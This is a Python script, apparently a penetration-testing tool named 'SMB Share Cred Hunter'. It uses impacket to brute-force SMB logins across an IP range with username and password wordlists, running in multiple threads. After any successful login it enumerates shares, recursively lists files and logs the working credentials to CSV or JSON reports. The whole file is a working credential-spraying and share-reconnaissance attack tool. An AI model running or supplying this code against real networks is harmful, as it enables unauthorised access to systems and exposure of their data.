import threading
import queue
import ipaddress
import time
import argparse
import logging
import json
import csv
from impacket.smbconnection import SMBConnection
from itertools import product

# Decisions, decsions...
MAX_DEPTH = 3
MAX_FILE_SIZE = 10 * 1024 * 1024
THROTTLE_DELAY = 0.5
THREAD_COUNT = 10
LOG_FILE = "smb_scan.log"
CSV_OUTPUT = "smb_scan_report.csv"
JSON_OUTPUT = "smb_scan_report.json"

# Log the stuff for evidence.
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")

log_lock = threading.Lock()
results_lock = threading.Lock()
results = []

def log(message):
    with log_lock:
        print(message)
        logging.info(message)

# Choose username and password lists
def load_users(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def load_passwords(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Traverse through any SMB shares
def traverse_share(smb, share, path, ip, username, depth=0):
    if depth > MAX_DEPTH:
        return
    try:
        files = smb.listPath(share, path + "*")
        for f in files:
            name = f.get_longname()
            if name in [".", ".."]:
                continue
            full_path = path + name
            if f.is_directory():
                traverse_share(smb, share, full_path + "\\", ip, username, depth + 1)
            else:
                if f.get_filesize() <= MAX_FILE_SIZE:
                    log(f"    [FILE] {ip} -> {share}:{full_path} ({f.get_filesize()} bytes)")
                    with results_lock:
                        results.append({
                            "host": ip,
                            "share": share,
                            "file_path": full_path,
                            "file_size": f.get_filesize(),
                            "username": username
                        })
    except Exception as e:
        log(f"    [!] Error traversing {share}:{path} on {ip} - {e}")

# Attempt SMB login and scanning
def scan_host(ip, creds, max_attempts):
    attempt_count = 0
    for username, password in creds:
        if max_attempts and attempt_count >= max_attempts:
            log(f"[~] Max attempts reached for {ip}")
            break

        try:
            smb = SMBConnection(ip, ip, sess_port=445, timeout=5)
            smb.login(username, password)
            log(f"[+] SUCCESS {ip} with {username}:{password}")
            shares = smb.listShares()
            for share in shares:
                share_name = share['shi1_netname'][:-1]
                log(f"  [SHARE] {ip} -> {share_name}")
                traverse_share(smb, share_name, "\\", ip, username)
            smb.close()
            break  # Stop trying other creds after successful login
        except Exception as e:
            log(f"[-] FAIL {ip} {username}:{password} - {e}")
        time.sleep(THROTTLE_DELAY)
        attempt_count += 1

# Make it multi-threaded
def worker(host_queue, creds, max_attempts):
    while not host_queue.empty():
        ip = host_queue.get()
        try:
            scan_host(ip, creds, max_attempts)
        except Exception as e:
            log(f"[!] Exception scanning {ip}: {e}")
        host_queue.task_done()

# Get the target set and filter out any excluded targets if applicable
def get_targets(ip_input, exclude_list):
    # Determine IPs to exclude
    excluded_ips = set()
    for exclusion in exclude_list:
        try:
            net = ipaddress.ip_network(exclusion, strict=False)
            excluded_ips.update(str(ip) for ip in net.hosts())
        except ValueError:
            excluded_ips.add(exclusion.strip())

    # Grab the target IPs
    try:
        all_ips = [str(ip) for ip in ipaddress.ip_network(ip_input, strict=False)]
    except ValueError:
        with open(ip_input, "r") as f:
            all_ips = [line.strip() for line in f if line.strip()]

    return [ip for ip in all_ips if ip not in excluded_ips]

# Make your fancy output here.
def write_report(format):
    if format == "csv":
        with open(CSV_OUTPUT, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["host", "share", "file_path", "file_size", "username"])
            writer.writeheader()
            writer.writerows(results)
        log(f"[+] CSV report written to {CSV_OUTPUT}")
    elif format == "json":
        with open(JSON_OUTPUT, "w") as f:
            json.dump(results, f, indent=2)
        log(f"[+] JSON report written to {JSON_OUTPUT}")
    else:
        log("[!] Unknown report format. Skipping report output.")

# Do all the things
def main():
    parser = argparse.ArgumentParser(description="SMB Share Cred Hunter. Find the creds those dummies hardcoded!")
    parser.add_argument("-i", "--input", required=True, help="IP range (e.g. 192.168.1.0/24) or IP list file")
    parser.add_argument("--users", required=True, help="User list file (one per line)")
    parser.add_argument("--passwords", required=True, help="Password list file (one per line)")
    parser.add_argument("-r", "--report-format", choices=["csv", "json"], default="csv", help="Report format")
    parser.add_argument("--max-attempts", type=int, default=0, help="Max credential attempts per host (0 = unlimited)")
    parser.add_argument("--exclude", default="", help="Comma-separated IPs or CIDR ranges to exclude")

    args = parser.parse_args()

    exclude_list = [x.strip() for x in args.exclude.split(",")] if args.exclude else []
    targets = get_targets(args.input, exclude_list)
    users = load_users(args.users)
    passwords = load_passwords(args.passwords)
    creds = list(product(users, passwords))

    log(f"[~] Loaded {len(targets)} targets, {len(creds)} credential pairs, {len(exclude_list)} exclusions")

    host_queue = queue.Queue()
    for ip in targets:
        host_queue.put(ip)

    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(host_queue, creds, args.max_attempts))
        t.start()
        threads.append(t)

    host_queue.join()
    for t in threads:
        t.join()

    write_report(args.report_format)
    log("Scan completed.")

if __name__ == "__main__":
    main()
